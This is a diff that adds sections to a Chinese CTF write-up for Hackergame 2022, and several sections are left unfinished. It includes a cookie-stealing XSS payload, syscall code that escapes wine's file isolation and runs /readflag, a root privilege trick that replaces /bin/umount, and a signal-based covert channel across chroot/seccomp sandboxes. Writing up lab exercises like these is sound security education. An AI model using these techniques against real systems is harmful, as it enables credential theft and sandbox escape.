@@ -628,6 +628,8 @@ Date: Fri, 28 Oct 2022 09:16:08 GMT
 
 # Write Up Part II
 
+这里放段字，防止两个标题挨得太近出 Bug
+
 ## LaTeX 机器人
 
 :::question
@@ -1413,25 +1415,1010 @@ Debugger: process has exited (exit code -1)
 
 ## 微积分计算小练习
 
+:::question
+
+小 X 作为某门符号计算课程的助教，为了让大家熟悉软件的使用，他写了一个小网站：上面放着五道简单的题目，只要输入姓名和题目答案，提交后就可以看到自己的分数。
+
+[点击此链接访问练习网站](http://202.38.93.111:10056/?token=534%3AMEUCIQDaou7cyjyx8wag%2B%2FM4mE9ujZxx4x3zqTGeSXOYAb7c2QIgOC3MvDnhg7nXfRsK04xoaa%2B0pNw4%2BJdV5z3ZYkiLTdo%3D)
+
+想起自己前几天在公众号上学过的 Java 设计模式免费试听课，本着前后端离心（咦？是前后端离心吗？还是离婚？离。。离谱？总之把功能能拆则拆就对啦）的思想，小 X 还单独写了一个程序，欢迎同学们把自己的成绩链接提交上来。
+
+总之，因为其先进的设计思想，需要同学们做完练习之后手动把成绩连接贴到这里来：
+
+[点击此链接提交练习成绩 URL](http://202.38.93.111:10057/?token=534%3AMEUCIQDaou7cyjyx8wag%2B%2FM4mE9ujZxx4x3zqTGeSXOYAb7c2QIgOC3MvDnhg7nXfRsK04xoaa%2B0pNw4%2BJdV5z3ZYkiLTdo%3D)
+
+:::
+
+<CH.Section>
+
+读一下程序，发现 bot 会[把 flag 放到 _`document.cookie`_ 里面](focus://bot.py#2:3)。
+
+最后 bot 会把 _`greeting`_ 和 _`score`_ 两个元素内的文本内容输出出来。
+
+所以我们需要构造一个脚本注入，把其中一个元素替换成 _`document.cookie`_ 的内容。
+
+然后网页上可以注入的地方只有姓名一栏。写了个简单的 payload 就过了.
+
+<CH.Code>
+
+```python bot.py
+...
+print(' Putting secret flag...')
+driver.execute_script(f'document.cookie="flag={FLAG}"')
+time.sleep(1)
+
+print('- Now browsing your quiz result...')
+driver.get(url)
+time.sleep(4)
+
+try:
+    greeting = driver.execute_script(f"return document.querySelector('#greeting').textContent")
+    score = driver.execute_script(f"return document.querySelector('#score').textContent")
+except selenium.common.exceptions.JavascriptException:
+    print('JavaScript Error: Did you give me correct URL?')
+    exit(1)
+
+print("OK. Now I know that:")
+print(greeting)
+print(score)
+...
+```
+
+---
+
+```html payload
+<img src="empty.gif" onerror="document.getElementById('greeting').textContent=document.cookie" />
+```
+
+</CH.Code>
+
+</CH.Section>
+
 ## 杯窗鹅影
+
+:::question
+
+说到上回，小 K 在获得了实验室高性能服务器的访问权限之后就迁移了数据（他直到现在都还不知道自己的家目录备份被 Eve 下载了）。之后，为了跑一些别人写的在 Windows 下的计算程序，他安装了 wine 来运行它们。
+
+「你用 wine 跑 Windows 程序，要是中毒了咋办？」
+
+「没关系，大不了把 wineprefix 删了就行。我设置过了磁盘映射，Windows 程序是读不到我的文件的！」
+
+但果真如此吗？
+
+为了验证这一点，你需要点击「打开/下载题目」按钮，上传你的程序实现以下的目的：
+
+1. `/flag1` 放置了第一个 flag。你能给出一个能在 wine 下运行的 x86_64 架构的 Windows 命令行程序来读取到第一个 flag 吗？
+2. `/flag2` 放置了第二个 flag，但是需要使用 `/readflag` 程序才能看到 `/flag2` 的内容。你能给出一个能在 wine 下运行的 x86_64 架构的 Windows 命令行程序来执行 `/readflag` 程序来读取到第二个 flag 吗？
+
+:::
 
 ### flag1
 
+Google 搜索 `read linux host file in wine`, 点进[第一个来自 StackExchange 的搜索结果](https://unix.stackexchange.com/questions/28594/access-to-the-files-beyond-wines-virtual-disks)， 回答的评论里提到了 Wine 中的程序仍然可以使用 Linux 系统调用。
+
+> Wine is not a sandbox – a  program can use Linux syscalls to interact with the rest of the system  bypassing Wine, although this is unlikely to happen unless the program  was intentionally written to do that.
+>
+> – [ephemient](https://unix.stackexchange.com/users/1779/ephemient)                
+>
+> [Jan 9, 2012 at 2:57](https://unix.stackexchange.com/questions/28594/access-to-the-files-beyond-wines-virtual-disks#comment38504_28596)
+
+那就把系统调用写到内联汇编里吧。（交叉编译用不了 linux 的头文件）
+
+不就是写两个系统调用嘛，一个 `open` 打开文件，一个 `read` 读取文件。
+
+```c read.c
+#include <stdio.h>
+#include <stdlib.h>
+
+volatile char filename[] = "/flag1";
+volatile char buf[1024];
+
+int main() {
+  {
+    asm("movq %1, %%rdi\n"
+        "movq $2, %%rax\n" /*Open*/
+        "xorq %%rsi, %%rsi\n" /*ReadOnly*/
+        "xorq %%rdx, %%rdx\n"
+        "syscall\n"
+        "movq %%rax, %%rdi\n"
+        "movq $0,%%rax;\n" /*Read*/
+        "leaq %0, %%rsi\n"
+        "movq $1023,%%rdx;\n"
+        "syscall\n"
+        : "=m"(buf)
+        : "r"(filename));
+  }
+  printf("%s", buf);
+  return 0;
+}
+```
+
+```shell
+x86_64-w64-mingw32-gcc read.c
+```
+
+把 `a.exe` 交上去，果然过了。
+
+flag 里提到了 `directory_traversal`, 可能我的做法不是预期做法。
+
 ### flag2
+
+flag1 拿得到，flag2 其实就更简单了，甚至就只需要一个 `execve` 系统调用就可以做到。
+
+```c exec.c
+#include <stdio.h>
+#include <stdlib.h>
+
+volatile char filename[] = "/readflag";
+volatile char buf[1024];
+
+int main() {
+  {
+    asm("movq %0, %%rdi\n"
+        "xorq %%rsi, %%rsi\n" /*cmdline: NULL*/
+        "xorq %%rdx, %%rdx\n" /*env: NULL*/
+        "movq $59, %%rax\n"   /*execve*/
+        "syscall\n"
+        : : "r"(filename));
+  }
+  printf("%s", buf);
+  return 0;
+}
+```
+
+# Write Up Part |||
+
+这里也要放段字，防止两个标题挨得太近出 Bug。跪求大佬给我发个 PR 修 Bug。
+
+诶。。。你有没有注意到这次标题好像和前两个有点不一样啊。。
 
 ## 二次元神经网络
 
+:::question
+
+天冷极了，下着雪，又快黑了。这是一年的最后一天——大年夜。在这又冷又黑的晚上，一个没有 GPU、没有 TPU 的小女孩，在街上缓缓地走着。她从家里出来的时候还带着捡垃圾捡来的 E3 处理器，但是有什么用呢？跑不动 Stable  Diffusion，也跑不动 NovelAI。她也想用自己的处理器训练一个神经网络，生成一些二次元的图片。
+
+于是她配置好了 PyTorch 1.9.1，定义了一个极其简单的模型，用自己收集的 10 张二次元图片和对应的标签开始了训练。
+
+```
+SimpleGenerativeModel(
+  (tag_encoder): TagEncoder(
+    (embedding): Embedding(63, 8, padding_idx=0)
+  )
+  (model): Sequential(
+    (0): Linear(in_features=16, out_features=8, bias=True)
+    (1): ReLU()
+    (2): Linear(in_features=8, out_features=8, bias=True)
+    (3): ReLU()
+    (4): Linear(in_features=8, out_features=64 * 64 * 3, bias=True)
+    (5): Tanh()
+  )
+)
+```
+
+她在 CPU 上开始了第一个 epoch 的训练，loss 一直在下降，许多二次元图片重叠在一起，在向她眨眼睛。
+
+她又开始了第二个 epoch，loss 越来越低，图片越来越精美，她的眼睛也越来越累，她的眼睛开始闭上了。
+
+...
+
+第二天清晨，这个小女孩坐在墙角里，两腮通红，嘴上带着微笑。新年的太阳升起来了，照在她小小的尸体上。
+
+人们发现她时才知道，她的模型在 10 张图片上过拟合了，几乎没有误差。
+
+（完）
+
+听完这个故事，你一脸的不相信：「这么简单的模型怎么可能没有误差呢？」，于是你开始复现这个二次元神经网络。
+
+:::
+
+### 初始想法
+
+
+
+### 失败的尝试
+
+### 成功拿到 flag
+
 ## 光与影
 
-## 链上记忆大师（Level 1）
+:::question
+
+冒险，就要不断向前！
+
+在寂静的神秘星球上，继续前进，探寻 flag 的奥秘吧！
+
+提示：题目代码编译和场景渲染需要一段时间（取决于你的机器配置），请耐心等待。如果你看到 "Your WebGL context has  lost." 的提示，则可能需要更换浏览器或环境。目前我们已知在 Linux 环境下，使用 Intel 核显的 Chrome/Chromium  用户可能无法正常渲染。
+
+:::
+
+先把整个网站下载下来，方便我们编辑。什么？你问我为什么不用 Chromium 的 Overrides 功能？？？我身为卑微的 Linux 用户用 Chromium 打开这个有毒的页面就直接卡死！气死我了。可惜 Firefox 没有 Overrides 功能。
+
+WebGL 啊， WebGL. 看不懂。。。没学过。。随便改改代码吧。
+
+![image-20221029091744247](light──shadow.png)
+
+代码里有几个又臭又长的 `tiSDF` 函数，我盲才 flag 的玄机就藏在这些函数里面。但是 `t5SDF` 这个函数却短的离谱。
+
+![image-20221029091951684](minminmin.png)
+
+```glsl fragment-shader.glsl
+float t5SDF(vec3 p, vec3 b, float r) {
+  vec3 q = abs(p) - b;
+  return length(max(q,0.0)) + min(max(q.x,max(q.y,q.z)),0.0) - r;
+}
+```
+
+我们直接把 `t5SDF` 的返回值改成 0 试试：
+
+```glsl fragment-shader.glsl
+float t5SDF(vec3 p, vec3 b, float r) {
+  vec3 q = abs(p) - b;
+  return .0;
+}
+```
+
+整个屏幕直接变黑了。这显然不是我们想要的。
+
+![image-20221029092456470](black.png)
+
+把返回值修改成 `100.0` , flag 到手了
+
+![image-20221029092716360](flag-light.png)
+
+## 链上记忆大师（记忆练习）
+
+:::question
+
+听说你在区块链上部署的智能合约有过目不忘的能力。
+
+:::
+
+我简单地看了一下题目，大概意思就是让我们写一个智能合约记住给定的数字。
+
+```solidity challenge1.sol
+pragma solidity =0.8.17;
+
+interface MemoryMaster {
+    function memorize(uint256 n) external;
+    function recall() external view returns (uint256);
+}
+
+contract Challenge {
+    function test(MemoryMaster m, uint256 n) external returns (bool) {
+        m.memorize(n);
+        uint256 recalled = m.recall();
+        return recalled == n;
+    }
+}
+```
+
+第一小问会点 Solidity 就能写出来。
+
+<CH.Section>
+
+<CH.Code>
+
+```solidity player1.sol
+pragma solidity =0.8.17;
+
+contract MemoryMaster {
+    uint256 storedData;
+    function memorize(uint256 n) external {
+        storedData = n;
+    }
+    function recall() external view returns (uint256) {
+        return storedData;
+    }
+}
+```
+
+```python compile.py
+from solcx import compile_source
+import json
+
+for i in 1, 2, 3:
+    compiled_sol = compile_source(open(f'challenge{i}.sol').read(), output_values=['abi', 'bin'])
+    contract_interface = compiled_sol['<stdin>:Challenge']
+    bytecode = contract_interface['bin']
+    abi = contract_interface['abi']
+    json.dump((bytecode, abi), open(f'contract{i}.json', 'w'))
+
+for i in (1,):
+    compiled_sol = compile_source(open(f'player{i}.sol').read(), output_values=['abi', 'bin'])
+    contract_interface = compiled_sol['<stdin>:MemoryMaster']
+    bytecode = contract_interface['bin']
+    abi = contract_interface['abi']
+    json.dump((bytecode, abi), open(f'player{i}.json', 'w'))
+```
+</CH.Code>
+
+稍微改了一下 [`compile.py`](focus://compile.py#1:20), 让它一起把我编写的 `player1.sol` 编译掉。
+
+</CH.Section>
+
+把编译出来的 16 进制码交上去，第一问就过了。
 
 ## 传达不到的文件
 
+:::question
+
+为什么会变成这样呢？第一次有了 `04111` 权限的可执行文件，有了 `0400` 权限的 flag 文件，两份快乐的事情重合在一起；而这两份快乐，又给我带来更多的快乐。得到的，本该是……（被打死）
+
+------
+
+探索虚拟环境，拿到两个 flag：flag1 在 `/chall` 中，flag2 在 `/flag2` 中。
+
+你可以在下面列出的两种方法中任选其一来连接题目：
+
+- 点击下面的 "打开/下载题目" 按钮通过网页终端与远程交互。如果采用这种方法，在正常情况下，你不需要手动输入 token。
+- 在 Linux、macOS、WSL 或 Git Bash 等本地终端中使用 `stty raw -echo; nc 202.38.93.111 10338; stty sane` 命令来连接题目。如果采用这种方法，你必须手动输入 token（复制粘贴也可）。**注意，输入的 token 不会被显示，输入结束后按 Ctrl-J 即可开始题目。**
+
+无论采用哪种方法连接题目，启动题目均需要数秒时间，出现黑屏是正常现象，请耐心等待。
+
+:::
+
 ### 读不到
+
+一开始我以为 `chall` 会有缓冲区溢出漏洞，结果用下面的命令一试发现没有。
+
+```shell
+/ $ yes 'y' | tr -d '\n' | ./chall
+Give me your FLAG or I'll EXIT!
+FLAG: / $ 
+```
+
+我们发现 `/bin/busybox` 在我们的控制范围之内，其实`/bin` 和 `/sbin`目录里的文件都在我们的控制范围之内。
+
+通过读取 `/etc/init.d/rcS` 我们发现在退出当前的 shell 之后 `rcS` 还会执行 `umount` 和 `poweroff` 命令(注意是以 root 身份执行)。
+
+下面是探索过程的 shell 录制(不是视频).
+
+<AsciinemaPlayer src="./explore.cast" rows={20} cols={90}/>
+[](explore.cast)
+
+那么我们就可以通过篡改 `/bin/mount` 来把 `/chall` 读出来, base64 编码，然后在自己的笔记本上解码得到 `./chall` 文件。
+
+<AsciinemaPlayer src="./umount.cast" rows={20} cols={90}/>
+[](umount.cast)
+
+在本地解码完成后，我们执行一下 `strings chall | grep flag` 就能拿到 flag 了。
+
+```shell
+$ strings chall | grep flag
+flag{ptr4ce_m3_4nd_1_w1ll_4lways_b3_th3r3_f0r_u}
+tmp_flag
+flag{ptr4ce_m3_4nd_1_w1ll_4lways_b3_th3r3_f0r_u}
+tmp_flag
+```
+
+flag 提到了 ptrace, 看来我的解法是非预期解法
 
 ### 打不开
 
+这个就比上一个更简单了，改一下 `/bin/umount` ，把文件 `cat` 出来就完了。
+
+<AsciinemaPlayer src="./flag2.cast" rows={20} cols={90}/>
+[](flag2.cast)
+
+当然这解法应该还是非预期解法。
+
 ## 看不见的彼方
+
+:::question
+
+虽然看见的是同一片天空（指运行在同一个 kernel 上），脚踏着的是同一块土地（指使用同一个用户执行），他们之间却再也无法见到彼此——因为那名为 `chroot(2)` 的牢笼，他们再也无法相见。为了不让他们私下串通，魔王甚至用 `seccomp(2)`，把他们调用与 socket 相关的和调试相关的系统调用的权利也剥夺了去。
+
+但即使无法看到对方所在的彼方，他们相信，他们的心意仍然是相通的。即使心处 `chroot(2)` 的牢笼，身缚 `seccomp(2)` 的锁链，他们仍然可以将自己想表达的话传达给对方。
+
+------
+
+你需要上传两个 x86_64 架构的 Linux 程序。为了方便描述，我们称之为 Alice 和 Bob。两个程序会在独立的 chroot 环境中运行。
+
+在 Alice 的环境中，secret 存储在 `/secret` 中，可以直接读取，但是 Alice 的标准输出和标准错误会被直接丢弃；在 Bob 的环境中，没有 flag，但是 Bob 的标准输出和标准错误会被返回到网页中。`/secret` 的内容每次运行都会随机生成，仅当 Bob 的标准输出输出与 Alice 的 `/secret` 内容相同的情况下，你才能够获得 flag。
+
+执行环境为 Debian 11，两个程序文件合计大小需要在 10M 以下，最长允许运行十秒。特别地，如果你看到 "Failed to  execute program."  或其他类似错误，那么说明你的程序需要的运行时库可能在环境中不存在，你需要想办法在满足大小限制的前提下让你的程序能够顺利运行。
+
+[构建环境相关的 Dockerfile 附件](https://hack.lug.ustc.edu.cn/media/30b4b248-eff5-5ec0-b5a7-310ca91550f3/kanata.zip)
+
+:::
+
+Google 搜索一下 `linux ipc`, 点进[第一个搜索结果](https://tldp.org/LDP/tlk/ipc/ipc.html)， 发现这道题似乎只能用信号来通信了，那就用信号来写一个吧。
+
+<CH.Scrollycoding lineNumbers={true} style={{'--ch-scrollycoding-sticker-width': '50%' }} rows={20}>
+
+<CH.Code>
+
+```c  common.h
+#define PID_START 1
+#define PID_END 800
+
+// to send one hex digit 0bxyzw
+// send zw
+// send xy
+
+#define SIG00 SIGUSR1
+#define SIG01 SIGUSR2
+#define SIG10 SIGURG
+#define SIG11 SIGCHLD
+```
+
+</CH.Code>
+
+#### Common
+
+- 我们先给 Alice 和 Bob 定义一个公共的头文件 `common.h`
+- 因为 Alice 和 Bob 不知道双方的 PID, 所以我们需要扫描一个 PID 段来让 Alice 和 Bob 建立连接
+- 我们把 `SIGWINCH` 作为一个特殊的信号, 用来建立连接（Connection）
+    - 之所以选这个信号是因为一般进程对该信号不做任何响应
+    - 也就是说，我们乱发信号不会产生不良后果（比如杀死系统进程）
+- 我们用一个 Unix 信号来表示两个位
+- 那么为了发送一个 16 进制数，我们就需要两个 Unix 信号
+- 我们就随便挑四个倒霉的 Unix 信号来传递消息
+
+---
+
+<CH.Code>
+
+```c alice.c
+#include <ctype.h>
+#include <signal.h>
+#include <stdbool.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include "common.h"
+
+volatile pid_t pid = 0;
+volatile bool start = false;
+
+char buffer[65];
+```
+
+```c  common.h
+#define PID_START 10
+#define PID_END 500
+
+// to send one hex digit 0bxyzw
+// send zw
+// send xy
+
+#define SIG00 SIGUSR1
+#define SIG01 SIGUSR2
+#define SIG10 SIGURG
+#define SIG11 SIGCHLD
+```
+
+</CH.Code>
+
+#### Alice setup
+
+- 引入头文件
+- 定义 _`pid`_ 变量存储 Bob 的 PID
+- 定义 _`start`_ 变量存储是否可以开始发送
+- 定义个 _`buffer`_ 来存读进来的机密
+
+---
+
+<CH.Code>
+
+```c alice.c focus=16:35
+#include <ctype.h>
+#include <signal.h>
+#include <stdbool.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include "common.h"
+
+volatile pid_t pid = 0;
+volatile bool start = false;
+
+char buffer[65];
+
+void handler(int sig, siginfo_t* info, void* context) {
+  if (sig == SIGWINCH) {
+    if (pid == 0) {
+      pid = info->si_pid;
+      start = true;
+    }
+  }
+}
+
+int main() {
+  // register actions
+  struct sigaction act = {0};
+  act.sa_sigaction = &handler;
+  act.sa_flags = SA_SIGINFO;
+  if (0 != sigaction(SIGWINCH, &act, NULL)) {
+    return -1;
+  }
+  // 未完待续
+}
+```
+
+
+</CH.Code>
+
+#### Alice's Signal Handler
+
+- 让 Alice 响应 _`SIGWINCH`_ 信号
+- 如果收到 _`SIGWINCH`_， 就把发送者的 _`pid`_ 记下来
+- 并且把开始发送的变量设置为 _`true`_
+
+---
+
+<CH.Code>
+
+```c alice.c focus=33:42
+#include <ctype.h>
+#include <signal.h>
+#include <stdbool.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include "common.h"
+
+volatile pid_t pid = 0;
+volatile bool start = false;
+
+char buffer[65];
+
+void handler(int sig, siginfo_t* info, void* context) {
+  if (sig == SIGWINCH) {
+    if (pid == 0) {
+      pid = info->si_pid;
+      start = true;
+    }
+  }
+}
+
+int main() {
+  // register actions
+  struct sigaction act = {0};
+  act.sa_sigaction = &handler;
+  act.sa_flags = SA_SIGINFO;
+  if (0 != sigaction(SIGWINCH, &act, NULL)) {
+    return -1;
+  }
+  // read secret
+  FILE* file;
+  file = fopen("./secret", "r");  // assume success
+  fread(buffer, 64, 1, file);
+  printf("Read");
+  // wait for bob
+  while (!start) {
+    // do nothing
+  }
+  // 未完待续
+}
+```
+
+</CH.Code>
+
+#### Alice Reads Secret
+
+- 让 Alice 把机密读出来。
+- 通过阅读 `server.py` 我们能知道机密是一串长度为 64 的16进制数。
+- 在 Bob 通知 Alice 发送机密之前，什么都不做
+
+---
+
+<CH.Code>
+
+```c alice.c focus=25:42
+#include <ctype.h>
+#include <signal.h>
+#include <stdbool.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include "common.h"
+
+volatile pid_t pid = 0;
+volatile bool start = false;
+
+char buffer[65];
+
+void handler(int sig, siginfo_t* info, void* context) {
+  if (sig == SIGWINCH) {
+    if (pid == 0) {
+      pid = info->si_pid;
+      start = true;
+    }
+  }
+}
+
+void send_half_hex(int val) {
+  switch (val) {
+    case 0b00:
+      kill(pid, SIG00);
+      break;
+    case 0b01:
+      kill(pid, SIG01);
+      break;
+    case 0b10:
+      kill(pid, SIG10);
+      break;
+    case 0b11:
+      kill(pid, SIG11);
+      break;
+    default:
+      break;
+  }
+}
+
+int main() {
+  // register actions
+  struct sigaction act = {0};
+  act.sa_sigaction = &handler;
+  act.sa_flags = SA_SIGINFO;
+  if (0 != sigaction(SIGWINCH, &act, NULL)) {
+    return -1;
+  }
+  // read secret
+  FILE* file;
+  file = fopen("./secret", "r");  // assume success
+  fread(buffer, 64, 1, file);
+  printf("Read");
+  // wait for bob
+  while (!start) {
+    // do nothing
+  }
+  // 未完待续
+}
+```
+
+
+</CH.Code>
+
+#### Alice's Send Func, P1
+
+- 定义 _`send_half_hex`_ 这个函数来发送半个16进制数。
+- 通过 _`kill`_ 发送信号, 没啥好说的
+
+---
+
+<CH.Code>
+
+```c alice.c focus=44:52
+#include <ctype.h>
+#include <signal.h>
+#include <stdbool.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include "common.h"
+
+volatile pid_t pid = 0;
+volatile bool start = false;
+
+char buffer[65];
+
+void handler(int sig, siginfo_t* info, void* context) {
+  if (sig == SIGWINCH) {
+    if (pid == 0) {
+      pid = info->si_pid;
+      start = true;
+    }
+  }
+}
+
+void send_half_hex(int val) {
+  switch (val) {
+    case 0b00:
+      kill(pid, SIG00);
+      break;
+    case 0b01:
+      kill(pid, SIG01);
+      break;
+    case 0b10:
+      kill(pid, SIG10);
+      break;
+    case 0b11:
+      kill(pid, SIG11);
+      break;
+    default:
+      break;
+  }
+}
+
+void send_hex(int hex) {
+  int low = hex & 0b0011;
+  int high = hex >> 2;
+  // send low first
+  send_half_hex(low);
+  usleep(100);
+  send_half_hex(high);
+  usleep(100);
+}
+
+int main() {
+  // register actions
+  struct sigaction act = {0};
+  act.sa_sigaction = &handler;
+  act.sa_flags = SA_SIGINFO;
+  if (0 != sigaction(SIGWINCH, &act, NULL)) {
+    return -1;
+  }
+  // read secret
+  FILE* file;
+  file = fopen("./secret", "r");  // assume success
+  fread(buffer, 64, 1, file);
+  printf("Read");
+  // wait for bob
+  while (!start) {
+    // do nothing
+  }
+  // 未完待续
+}
+```
+
+</CH.Code>
+
+#### Alice's Send Func, P2
+
+- 定义 _`send_hex`_ 这个函数来发送一个16进制数。
+- 先发送低两位，后发送高两位
+- 注意两次发送之间要等待一段时间
+	- 因为 Unix 信号是异步的
+	- 这里涉及异步跨进程通信
+	- 等待 `100ms` 来防止奇奇怪怪的事情发生
+
+---
+
+<CH.Code>
+
+```c alice.c focus=71:83
+#include <ctype.h>
+#include <signal.h>
+#include <stdbool.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include "common.h"
+
+volatile pid_t pid = 0;
+volatile bool start = false;
+
+char buffer[65];
+
+void handler(int sig, siginfo_t* info, void* context) {
+  if (sig == SIGWINCH) {
+    if (pid == 0) {
+      pid = info->si_pid;
+      start = true;
+    }
+  }
+}
+
+void send_half_hex(int val) {
+  switch (val) {
+    case 0b00:
+      kill(pid, SIG00);
+      break;
+    case 0b01:
+      kill(pid, SIG01);
+      break;
+    case 0b10:
+      kill(pid, SIG10);
+      break;
+    case 0b11:
+      kill(pid, SIG11);
+      break;
+    default:
+      break;
+  }
+}
+
+void send_hex(int hex) {
+  int low = hex & 0b0011;
+  int high = hex >> 2;
+  // send low first
+  send_half_hex(low);
+  usleep(100);
+  send_half_hex(high);
+  usleep(100);
+}
+
+int main() {
+  // register actions
+  struct sigaction act = {0};
+  act.sa_sigaction = &handler;
+  act.sa_flags = SA_SIGINFO;
+  if (0 != sigaction(SIGWINCH, &act, NULL)) {
+    return -1;
+  }
+  // read secret
+  FILE* file;
+  file = fopen("./secret", "r");  // assume success
+  fread(buffer, 64, 1, file);
+  printf("Read");
+  // wait for bob
+  while (!start) {
+    // do nothing
+  }
+  // send data
+  for (int i = 0, hex; i < 64; i++) {
+    // get the hex digit
+    char ch = buffer[i];
+    if (isalpha(ch)) {
+      hex = ch - 'a' + 10;
+    } else {
+      hex = ch - '0';
+    }
+    printf("send hex %d\n", hex);
+    fflush(stdout);
+    send_hex(hex);
+  }
+  return 0;
+}
+```
+
+</CH.Code>
+
+#### Alice Ready
+
+- _`start`_ 被置为 _`true`_ 之后， Alice 就开始发送 flag
+- 注意要把 ASCII 字符先转成数字
+- 那么 Alice 这边就完事了
+
+---
+
+#### Bob Setup
+
+```c bob.c 
+#include <ctype.h>
+#include <signal.h>
+#include <stdbool.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include "common.h"
+
+volatile pid_t pid = 0;
+volatile bool success = false;
+volatile bool write_low = true;
+volatile int cnt = 0;
+volatile int buffer[64];
+pid_t self;
+```
+
+- 照例，引入一大堆头文件
+- 定义 _`pid`_ 变量存储 Bob 的 PID
+- 定义 _`success`_ 变量存储是否已经全部读完
+- 定义个 _`write_low`_ 来存接下来要读的是高两位还是低两位
+- 定义 _`cnt`_ 来存储已经读入的字数
+- 定义 _`buffer`_ 来存储已经读入的16进制数
+- 定义 _`self`_ 来存自己的 PID，防止自己给自己发信号
+
+---
+
+```c bob.c focus=20:50
+#include <ctype.h>
+#include <signal.h>
+#include <stdbool.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include "common.h"
+
+volatile pid_t pid = 0;
+volatile bool success = false;
+volatile bool write_low = true;
+volatile int cnt = 0;
+volatile int buffer[64];
+pid_t self;
+
+// 未完待续
+
+int main() {
+  self = getpid();
+  // we need to set it to \0 manually
+  //   buffer[64] = '\0';
+  memset((void*)buffer, 0, sizeof(buffer));
+  // register action
+  struct sigaction act = {0};
+  act.sa_sigaction = &handler;
+  act.sa_flags = SA_SIGINFO;
+  sigaction(SIGWINCH, &act, NULL);
+  sigaction(SIG00, &act, NULL);
+  sigaction(SIG01, &act, NULL);
+  sigaction(SIG10, &act, NULL);
+  sigaction(SIG11, &act, NULL);
+  // broadcast SIGWINCH
+  pid_t i = PID_START;
+  while (!success) {
+    if (i != self)
+      kill(i, SIGWINCH);
+    i++;
+    if (i > PID_END)
+      i = PID_START;
+  }
+  // output
+  output();
+  return 0;
+}
+```
+
+#### Bob's Main
+
+- 清空 _`buffer`_ (其实没必要)
+- 注册 _`sigaction`_ 的 _`handler`_
+- 广播 _`SIGWINCH`_ 信号
+- 如果成功，调用 _`output`_ 输出结果
+
+--- 
+
+```c bob.c focus=20:50
+#include <ctype.h>
+#include <signal.h>
+#include <stdbool.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include "common.h"
+
+volatile pid_t pid = 0;
+volatile bool success = false;
+volatile bool write_low = true;
+volatile int cnt = 0;
+volatile int buffer[64];
+pid_t self;
+
+// 未完待续
+
+int main() {
+  self = getpid();
+  // we need to set it to \0 manually
+  //   buffer[64] = '\0';
+  memset((void*)buffer, 0, sizeof(buffer));
+  // register action
+  struct sigaction act = {0};
+  act.sa_sigaction = &handler;
+  act.sa_flags = SA_SIGINFO;
+  sigaction(SIGWINCH, &act, NULL);
+  sigaction(SIG00, &act, NULL);
+  sigaction(SIG01, &act, NULL);
+  sigaction(SIG10, &act, NULL);
+  sigaction(SIG11, &act, NULL);
+  // broadcast SIGWINCH
+  pid_t i = PID_START;
+  while (!success) {
+    if (i != self)
+      kill(i, SIGWINCH);
+    i++;
+    if (i > PID_END)
+      i = PID_START;
+  }
+  // output
+  output();
+  return 0;
+}
+```
+
+WriteUp 还没写完。。。待续
+
+</CH.Scrollycoding>
 
 ## 量子藏宝图
 
